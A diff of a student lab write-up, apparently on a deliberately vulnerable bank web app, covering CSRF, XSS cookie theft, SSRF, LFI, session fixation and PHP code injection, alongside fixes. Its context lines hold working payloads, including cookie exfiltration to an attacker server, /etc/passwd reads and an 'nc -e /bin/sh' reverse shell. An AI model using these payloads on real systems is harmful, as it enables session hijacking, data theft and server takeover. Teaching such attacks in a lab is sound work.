@@ -9,7 +9,7 @@ __Solution__
 
 - Cross-site-request-forgery (CSRF)- is an attack where a malicious website exploits trust between the web browser and the authenticated user's website that is vulnerable.
 - Unauthorized requests or commands are executed on behalf of the victim on a vulnerable website.
--  Assume a vulnerable website that allows executing commands (like funds transfer) containing a URL for that fund's transfer. So when the user hits `transfer funds` with appropriate parameters, the request gets executed successfully.
+- Assume a vulnerable website that allows executing commands (like funds transfer) containing a URL for that fund's transfer. So when the user hits `transfer funds` with appropriate parameters, the request gets executed successfully.
 
 - Steps involved:
     - Setup a malicious website.
@@ -27,7 +27,7 @@ __Solution:__ Both of these are client-side attacks. But, Cross-site scripting (
 #### Task 3
 
 __Q: Briefly explain why your bank is theoretically vulnerable to CSRF/XSRF attack!__  
-__Solution:__ After examining the web request from the `Transfer Funds` page, the web application doesn't send a unique identifier or token, that identifies the request being originated from the same domain or performed by the actual user.
+__Solution:__ After examining the web request from the `Transfer Funds` page, the web application doesn't send a unique identifier or token, that identifies the request being originated from the same domain or performed by an actual user.
 
 ![funds_transfer](images/task2/funds_transfer.PNG)
 
@@ -37,7 +37,7 @@ __Solution:__ After examining the web request from the `Transfer Funds` page, th
 __Assume that you are a valid customer of your bank. Show how you can use XSRF to transfer money from another account to your account.__
 __Solution:__ 
 - In this attack, XSS vulnerability on the Account Details page is leveraged to perform CSRF.
-- Run the Python HTTP server, where `error.html` is located
+- Run the Python HTTP server, where `error.html` is located.
 
     ```bash
         python -m SimpleHTTPServer 81
@@ -81,13 +81,13 @@ __Solution:__
     ```javascript
         <script>function y(){window.open("http://localhost:81/error.html?x="+x, "_blank");}</script> 
     ```
-    - Payload3
+    - Payload 3
     ```javascript
 
         <a onclick="y()">Error please click here!!</a>
     ```
 
-- Once the payloads are transferred victim can see a ` Error please click here!!!` link in the remark field on the Account details page.
+- Once the payloads are transferred victim can see an ` Error please click here!!!` link in the remark field on the Account details page.
 
 
 
@@ -118,7 +118,7 @@ __solution__
 
 - Because of these limitations for the demonstration of the attack, we made the assumption.
 
-- To perfom the attack please repeat the process explained in excercise 1.d replacing the cookie.html code with the code given below.
+- To perform the attack please repeat the process explained in exercise 1.d replacing the cookie.html code with the code given below.
 
 ```html
 <html>
@@ -167,7 +167,7 @@ __solution__
 
 </html>
 ```
-- when the victim clicks the ` Error please click here!!!` link the attack will spread to all accounts on the bank server.
+- When the victim clicks the ` Error please click here!!!` link the attack will spread to all accounts on the bank server.
 
 ![Automated_Attack](images/task2/1.5.JPG)
 <br></br>
@@ -183,8 +183,8 @@ __Solution__
 
 - **Common SSRF attacks**
     - SSRF attacks can affect the server itself or the other backend systems that have a relation with the server.
-    - SSRF attacks against the server itself
-    - In an SSRF attack against the server itself,  the attacker tricks the application to make an HTTP request to the server itself via its loopback network interface. 
+    - SSRF attacks against the server itself.
+    - In an SSRF attack against the server itself, the attacker tricks the application to make an HTTP request to the server itself via its loopback network interface. 
     - Consider an example where a user makes a `POST` request to fetch a  product. 
     - the request looks like below
 
@@ -203,21 +203,21 @@ __Solution__
     Content-Length: 118
     stockApi=http://localhost/admin
     ```
-- which returns the admin contents to the user.  
+- Which returns the admin contents to the user.  
 
 - SSRF attacks against other back-end systems. This type of attack can be performed when the application vulnerable server can interact with other back-end systems that are not directly reachable by users. 
 
-- This attack can exploit  by requesting 
+- This attack can exploit by requesting 
     `stockApi=http://192.164.1.22/admin `
 
 - **Common SSRF defenses:**
-    - blacklist-based input filters
+    - blacklist-based input filters,
         The application should block the requests containing `localhost`, `127.0.0.1` or other sensitive keywords like `admin`.
-    - Whitelist-based input filters,by allowing input that matches, begins with, or contains
-    - Whitelist Domains in DNS.
-    - Do Not Send Raw Responses.
-    - Sanitize and Validate Inputs.
-    - Enable Authentication on All Services.
+    - Whitelist-based input filters,by allowing input that matches, begins with, or contains.
+    - Whitelist domains in DNS.
+    - Do not send raw responses.
+    - Sanitize and validate inputs.
+    - Enable authentication on all services.
 
 
 
@@ -233,7 +233,7 @@ __1. Briefly explain what is a Local File Inclusion (LFI) vulnerability? By usin
 
 __Solution:__  **Local File Inclusion (LFI)** is a web vulnerability, where an attacker tricks the web application to dynamically load files from the webserver that are available locally.
 
-*Example:* When an application receives an unsanitized user input,  and processed, which exposes local files because of the input that directly constructs the file path, which is included in a response
+*Example:* When an application receives an unsanitized user input, and processed, which exposes local files because of the input that directly constructs the file path, which is included in a response.
 
 **sample vulnerable code**
 
@@ -250,10 +250,10 @@ __Solution:__  **Local File Inclusion (LFI)** is a web vulnerability, where an a
 
 How it works:
 
-- The application uses file path as an input
-- user input is treated as trusted and safe
-- A local file can be included as a result of user-specified input to the file include
-- Application returns the file contents as a response
+- The application uses file path as an input.
+- User input is treated as trusted and safe.
+- A local file can be included as a result of user-specified input to the file include.
+- Application returns the file contents as a response.
 
 
 
@@ -282,14 +282,14 @@ How it works:
 
 __2. How do you identify and exploit LFI? Describe it with a simple example.__
 
-- Look for the page that includes file names or pages as URL parameters like
+- Look for the page that includes file names or pages as URL parameters like,
     ```javascript
          http://www.vbank.com/file.php?file=transfer.php 
     ```
-- change file by changing the file include or file path URL
-- Traverse through the directory to look for local files and observe the  response from the application
+- Change file by changing the file include or file path URL.
+- Traverse through the directory to look for local files and observe the  response from the application.
  
-- example..
+- Example..
     ```javascript
         http://www.vbank.com/file.php?file=../etc/shadow  //does'nt work
     ```
@@ -299,7 +299,7 @@ __2. How do you identify and exploit LFI? Describe it with a simple example.__
     ```javascript
         http://www.vbank.com/file.php?file=../../../etc/shadow // shows the shadow file
     ```
-- If the file path is true and the application doesn't filter and the file is available local to the server, contents can be displayed on the browser as a response
+- If the file path is true and the application doesn't filter and the file is available local to the server, contents can be displayed on the browser as a response.
 - The lack of input validation and filtering for files allows reading file contents.
 
 
@@ -333,12 +333,12 @@ __1. Install a webserver on your machine. Use it to write a script that will rea
 information required to hijack a session. Briefly describe your script.__
 
 __Solution:__ 
-    - Installed Python  and run the webserver module
+    - Installed Python  and run the webserver module,
 ```bash
     $ python3 -m http.server
         Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)
 ```  
-- Initiate multiple funds transfer with following remarks
+- Initiate multiple funds transfer with following remarks,
 > Multiple transfers are required as the remarks input is limited to 100 characters after encoding the contnets in it. For that reason, **payload is staged**.
 - Remarks in transfer 1:
 
@@ -350,7 +350,7 @@ __Solution:__
 
 - The above scripts automatically sends a `GET` request(whenn the victim page  is loaded) to the attacker address.
 
-- The request for the above script can be seen in attacker's server logs
+- The request for the above script can be seen in attacker's server logs,
     ```bash
         └─$ sudo python -m SimpleHTTPServer 81                                                                            
         Serving HTTP on 0.0.0.0 port 81 ...
@@ -362,7 +362,7 @@ __Solution:__
         192.168.37.128 - - [23/May/2021 15:38:23] "GET /c=USECURITYID=crblk95qe8b8mmdcva0saaj9m4 HTTP/1.1" 404 -
 
     ```
-- From the logs we can observe the request contents `USECURITYID=crblk95qe8b8mmdcva0saaj9m4` which we know that , is a cookie value.
+- From the logs we can observe the request contents `USECURITYID=crblk95qe8b8mmdcva0saaj9m4` which we know that, is a cookie value.
 
 
 
@@ -370,14 +370,14 @@ __2. Use the implementation from the last step to hijack the session of a custom
 
 __solution:__
 
-- Copy the `USECURITYID=b35oqi84j4l16mecckl4lksf60`(another captured cookie) that is captured on the server log
+- Copy the `USECURITYID=b35oqi84j4l16mecckl4lksf60`(another captured cookie) that is captured on the server log.
 - Installed `EditThisCookie` extension from chrome https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=en
-- Open the login page of the application in a private window 
+- Open the login page of the application in a private window .
 - Paste the cookie  value, into the `Value` field.
 ![edit_this_cookie](images/task2/edit_this_cookie.PNG)
-- Click on Green tick below the window
-- Reload the page
-- Should be logged in as a user
+- Click on Green tick below the window.
+- Reload the page.
+- Should be logged in as a user.
 - **Result**
 
 
@@ -400,17 +400,43 @@ __5. Implement some precautions which can prevent or mitigate this attack?__
 
 __Solution:__  
 1. Sanitize user input to avoid any injection into the application.
+- Vulnerable code:  
+
+    ```php
+    $sql="insert into ".$htbconf['db/transfers']." (".$htbconf['db/transfers.time'].", ".$htbconf['db/transfers.srcbank'].", ".$htbconf['db/transfers.srcacc'].", ".$htbconf['db/transfers.dstbank'].", ".$htbconf['db/transfers.dstacc'].", ".$htbconf['db/transfers.remark'].", ".$htbconf['db/transfers.amount'].") values(now(), ".$htbconf['bank/code'].", ".($http['srcacc'] ^ $xorValue).", ".$http['dstbank'].", ".$http['dstacc'].", '".$http['remark']."', ".$http['amount'].")";  
+
+    $result = mysql_query($sql);
+
+    ```
+
+- Fixed code:   
+    ```php
+    $sql="insert into ".$htbconf['db/transfers']." (".$htbconf['db/transfers.time'].", ".$htbconf['db/transfers.srcbank'].", ".$htbconf['db/transfers.srcacc'].", ".$htbconf['db/transfers.dstbank'].", ".$htbconf['db/transfers.dstacc'].", ".$htbconf['db/transfers.remark'].", ".$htbconf['db/transfers.amount'].") values(now(), ".$htbconf['bank/code'].", ".($http['srcacc'] ^ $xorValue).", ".$http['dstbank'].", ".$http['dstacc'].", '".htmlspecialchars($http['remark'])."', ".$http['amount'].")";  
+
+    $result = mysql_query($sql);
+    ```
+    ![XSS](images/task2/4_XSS.JPG)
 2. set `Http Only` flag to true in both index.php and login.php(where session is being set) to avoid cookies being accessed by client side scripts.
  
 ```php
 session_set_cookie_params($htbconf['bank/cookievalidity'],null,null,null,true);
 ```
-**Result** (after login cookie empty?)
+**Result**
+![Cookie_Hijaking_Fix](images/task2/HttpOnly_true.JPG)
+
+- `document.cookie` cant access cookie value.
 ![Cookie_Hijaking_Fix](images/task2/4.5.JPG)
 
 
-<!-- Todo Same origin policy -->
-<!-- Todo Fix XSS -->
+- Go to `etc/apache2/apache2.conf` file and override `AllowOverride none` to `AllowOverride All`. 
+
+![Cookie_Hijaking_Fix](images/task2/SameOrigin_Apacheconf.JPG)
+
+- Create a .htaccess file in your website directory (/var/www/html) with following lines.
+ 
+![Cookie_Hijaking_Fix](images/task2/SameOrigin_htaccess.JPG)
+
+    
 
 
 ### Exercise 5: Session Fixation
@@ -424,10 +450,10 @@ __2. Sketch an attack that allows you to take over the session of a bank user__
 __Solution :__
 - Found two approches in hijacking a session using session fixation.
     1. This approch leverages the phishing attack. A victim is provided with a link and assumption is that he clicks the link.
-    2. Manual way, setting the broswer cookie to desired value with key being `USECURITYID` (assuming that attacker has physical access to victim's browser)
+    2. Manual way, setting the broswer cookie to desired value with key being `USECURITYID` (assuming that attacker has physical access to victim's browser).
 
 **Approach 1** (Victim: `Alex`)
-- create a html file in your server folder with the following script
+- create a html file in your server folder with the following script,
 	```html
 		<html>
 		<script>
@@ -451,10 +477,10 @@ __Solution :__
 
     ![Attacker_Website](images/task2/5.1.JPG)
 
-- when user get redirect the cookie value will be set to `abcde`.
+- When user get redirect the cookie value will be set to `abcde`.
     ![Session_Fixation](images/task2/5.1.1.JPG).
 
-- use the cookie value obtained and edit in the browser application and reload the page
+- Use the cookie value obtained and edit in the browser application and reload the page.
     ![sesseion_fixation_0](images/task2/sesseion_fixation_0.PNG)
 
 - Attacker will now login into victim account.
@@ -463,7 +489,7 @@ __Solution :__
   
 **Approach 2: Manual Approach** (Victim: `Bob`)
 - **step 1**: Open `EditThiCookie` extension and click on import.
-- **step 2:** Use the following payload to set the cookie value
+- **step 2:** Use the following payload to set the cookie value,
 ```javascript
 [
 {
@@ -484,7 +510,7 @@ __Solution :__
 ```
  ![cookie_fixing](images/task2/cookie_fixing.PNG)
  
--  Allow the user to log in 
+-  Allow the user to log in.
 ***Before Log in***
 ![fixation_before_login](images/task2/fixation_before_login.PNG)
 
@@ -493,10 +519,10 @@ __Solution :__
 ![fixation_after_login](images/task2/fixation_after_login.png)
 
 
-- **step 3**: In another browser use the same cookie values to import it to `EditThisCookie` extension
+- **step 3**: In another browser use the same cookie values to import it to `EditThisCookie` extension.
 - **step 4** Reload the page.
 
- **Result** : Session successfully hijacked using the fixed cookie value
+ **Result** : Session successfully hijacked using the fixed cookie value.
 
 
 
@@ -525,14 +551,19 @@ __5. Accordingly, which countermeasure is necessary to prevent your attacks?
 Patch your system and test it against Session Fixation again.__
 
 
-__Solution__ Everytime a session has been started  regenerate the session id.
+__Solution__ Everytime a session has been started regenerate the session id.
 
 ```php
 	session_start();
 	session_regenerate_id(TRUE); 
 	$_SESSION=array(); // initializing a empty array values the session variable.
 ```
+![Session_fixation_before](images/task2/Session_fixation_before.JPG)
 
+
+
+
+![Session_fixation_after](images/task2/Session_fixation_after.JPG)
 
 
 ### Exercise 6: Remote Code Injection
@@ -546,21 +577,21 @@ $replaceWith =  "preg_replace('#\b". str_replace('\\',
                 '\\\\', $http['query']) ."\b#i', '<span
                 class=\"queryHighlight\">\\\\0</span>','\\0')";
 ```
-preg_replace function is in strings and input is part of the string, terminated using `'` and injected php code and opened `'` for the continueing string
+preg_replace function is in strings and input is part of the string, terminated using `'` and injected php code and opened `'` for the continueing string.
 
 payload:
 ```php
     ' . phpinfo() .'
 ```
-> `.` is used to concatenate to the string
+> `.` is used to concatenate to the string.
 
-that breaks the following query
+that breaks the following query,
 ```php
 $replaceWith =  "preg_replace('#\b". str_replace('\\',
                 '\\\\', $http['query']) ."\b#i', '<span
                 class=\"queryHighlight\">\\\\0</span>','\\0')";
 ```
-into
+into,
 
 ```php
 $replaceWith = "preg_replace('#\b'. phpinfo() .'\b#i', '\\0','\0')";
@@ -594,7 +625,7 @@ __solution__
 ![code_execution_output](images/task2/code_execution_output.PNG)
 
 
-- Found `config.php` file in `/etc` folder, now use the path to display out to the browser
+- Found `config.php` file in `/etc` folder, now use the path to display out to the browser.
 
     ``` php
     '. system("cat ../etc/config.php"); .' 
@@ -645,10 +676,10 @@ __Solution__
 Yes, as the code injection can lead to server takeover, it is possible to view database and passwords of all the bank acounts running on root host.
 Since the settings(`example.conf`) can be modified(Assuming the taken over account has write permissions).
 
-> usually database is same for all sub-domains in the application, unless the database is different for each virtual host, there are chances that vulnerable vhost has no to minimum impact on accessing other databases.
+> Usually database is same for all sub-domains in the application, unless the database is different for each virtual host, there are chances that vulnerable vhost has no to minimum impact on accessing other databases.
 
 If one virtual host is exploitable(code injection) that lead to other subdomain take over because of remote code injection vulnerability in one, which is a potential risk in vhosts.
-- Even though attacker may not have access to other subdomains intially, vulnerable subdomain(which attacker has access to) leads to other sub-domain take over.
+- Even though attacker may not have access to other subdomains intially, vulnerable subdomain (which attacker has access to) leads to other sub-domain take over.
 
 
 __5. Display /etc/passwd of the web server, the bank application is running on. Try
@@ -664,7 +695,7 @@ __solution__
 
     ![etc_passwd_displaying](images/task2/etc_passwd.PNG)
 
-- other methods used/tried:(not successful)
+- Other methods used/tried:(not successful)
 
 ```php
     ' . echo include_once('/etc/passwd') . '
@@ -678,12 +709,12 @@ __solution__
     ' .  echo file_get_contents("../../../../../../../etc/passwd"); . '
 ```
 
-the above methods are un-successfull as they are executing on server side but not as a response that can be viewed in browser.
+The above methods are un-successfull as they are executing on server side but not as a response that can be viewed in browser.
 
 
 __6. Show how to “leak” the complete source files of your web application. Briefly describe, how you accomplished this.__
 __solution :__
-- since  command execution on `htbdetails` > `Account details` page is possible, we used system commands to display the source files
+- Since, command execution on `htbdetails` > `Account details` page is possible, we used system commands to display the source files.
 
 - Leaking index page
     - payload used 
@@ -728,14 +759,14 @@ __solution :__
     '. system("nc -e /bin/sh 192.168.37.128 1234") .'
 ```
 
-- On attcker machine (listen on corresponding port - 1234)
+- On attcker machine (listen on corresponding port - 1234),
 ```bash
     $ sudo nc -lvnp  1234  
 ```
 - **Result** (received connection from victim)
 ![reverse_shell](images/task2/reverse_shell.PNG)
 
-**b**). look for file permissions of index page (navigate to /var/www/html/htdocs)
+**b**). look for file permissions of index page (navigate to /var/www/html/htdocs),
 ```bash
 $ ls -la
 ls -la
@@ -751,10 +782,10 @@ drwxr-xr-x 3 root  root 4096 Mar 20  2014 images
 
 ```
 
-> `index.php` is not writeable- hence defacing the obrtained account is not possible
+> `index.php` is not writeable- hence defacing the obrtained account is not possible.
 
 
-**c**). Escaping tty shell for better readability in terminal
+**c**). Escaping tty shell for better readability in terminal.
 - payload used:
     ```bash
     python -c 'import pty; pty.spawn("/bin/sh")'
@@ -775,7 +806,7 @@ drwxr-xr-x 3 root  root 4096 Mar 20  2014 images
     -rw-r--r--  1 kali kali   4705 Feb 23 05:36 .bashrc
     -rw-r--r--  1 kali kali   3526 Feb 23 05:36 .bashrc.original
     ```
-    > Since .bash_history is not writable, deleting is not possible
+    > Since .bash_history is not writable, deleting is not possible.
 
 - locating other log files
     ```bash
